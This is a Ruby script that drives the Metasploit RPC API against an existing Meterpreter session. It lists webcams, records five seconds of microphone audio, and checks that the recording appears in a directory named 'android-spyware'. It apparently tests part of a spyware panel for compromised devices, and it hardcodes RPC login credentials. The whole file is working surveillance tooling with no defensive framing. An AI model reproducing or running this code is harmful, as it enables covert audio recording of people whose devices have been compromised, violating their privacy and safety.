require 'msfrpc-client'

puts "=== MODERN AUDIO TEST (Near-Live) ==="

begin
  rpc = Msf::RPC::Client.new(
    host: ENV['RAILS_HOST'] || 'metasploit',
    port: 3333,
    uri: '/api/',
    ssl: true
  )
  rpc.login('cool', 'looc')
  
  session_id = rpc.call('session.list').keys.first
  
  if session_id
    puts "✅ Using Session #{session_id}"
    
    # Check if mic is available
    puts "Checking Microphone..."
    rpc.call('session.meterpreter_write', session_id, 'webcam_list')
    sleep 2
    res = rpc.call('session.meterpreter_read', session_id)
    puts res['data'] if res
    
    # Record 5 seconds chunk to specific shared path
    puts "\n🎙️ Recording 5 seconds of audio..."
    
    # Path inside Metasploit container (where it saves)
    msf_path = "/root/files/audio_test_shared.wav"
    
    # Path inside Rails container (where we check)
    rails_path = "/app/android-spyware/files/audio_test_shared.wav"
    
    puts "Saving to MSF path: #{msf_path}"
    
    rpc.call('session.meterpreter_write', session_id, "record_mic -d 5 -f #{msf_path}")
    
    output = ""
    10.times do 
        sleep 1
        res = rpc.call('session.meterpreter_read', session_id)
        if res && res['data'] && !res['data'].empty?
           output += res['data']
           print "."
        end
    end
    
    puts "\n\nResult:"
    puts output
    
    if File.exist?(rails_path)
        puts "✅ Audio file verified at #{rails_path}"
        puts "Size: #{File.size(rails_path)} bytes"
    else
        puts "❌ File not found at #{rails_path}"
        puts "Check if volumes are shared correctly."
    end
    
  else
    puts "❌ No session found."
  end

rescue => e
  puts "❌ Error: #{e.message}"
end
